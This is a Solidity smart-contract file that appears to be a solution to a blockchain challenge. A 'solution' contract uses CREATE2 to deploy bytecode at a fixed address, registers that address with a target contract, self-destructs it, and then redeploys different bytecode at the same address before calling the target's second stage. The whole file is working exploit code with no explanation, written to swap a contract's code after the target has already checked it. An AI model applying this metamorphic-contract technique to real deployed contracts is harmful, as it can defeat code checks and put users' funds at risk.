/**
 *Submitted for verification at Etherscan.io on 2021-03-29
*/

contract Target{
    function part1(address addr) external{}
    function part2() external{}
    function die() external{}
}
contract solution{
    event deployed(address indexed addr);
    bytes  _deployBytecode;
            bytes  bc = hex"6080604052348015600f57600080fd5b5060808061001e6000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c8063a22f832514602d575b600080fd5b60336045565b60408051918252519081900360200190f35b602a9056fea2646970667358221220c95651ab363b252f9bc2a0e1b2830c61a7323e30fa0db75656b5987af8e5f5db64736f6c63430007060033";
        bytes  bcc = hex"6080604052348015600f57600080fd5b50607880601d6000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c8063a22f832514602d575b600080fd5b6101a460405190815260200160405180910390f3fea26469706673582212205018820084be13c61ba5aa5c7c6a03a0b73aefac9993bed5f84ccc8ad75f455964736f6c63430008030033";
    function win(address target, uint salt) public{
        bytes memory  const = hex"6080604052348015600f57600080fd5b506000339050606081600160a060020a03166331d191666040518163ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040160006040518083038186803b158015606b57600080fd5b505afa158015607e573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f19168201604052602081101560a657600080fd5b81019080805164010000000081111560bd57600080fd5b8201602081018481111560cf57600080fd5b815164010000000081118282018710171560e857600080fd5b5050805190945092508291505060208301f3fe";

        address addr;
        _deployBytecode = bc;
        assembly {addr := create2(0, add(const, 0x20), mload(const), salt)}
                emit deployed(addr);

        Target(target).part1(addr);
        Target(addr).die();
        _deployBytecode = bcc;
        assembly {addr := create2(0, add(const, 0x20), mload(const), salt)}
         Target(target).part2();
    }

    function deployBytecode() public view returns(bytes memory){
        return _deployBytecode;
    }
}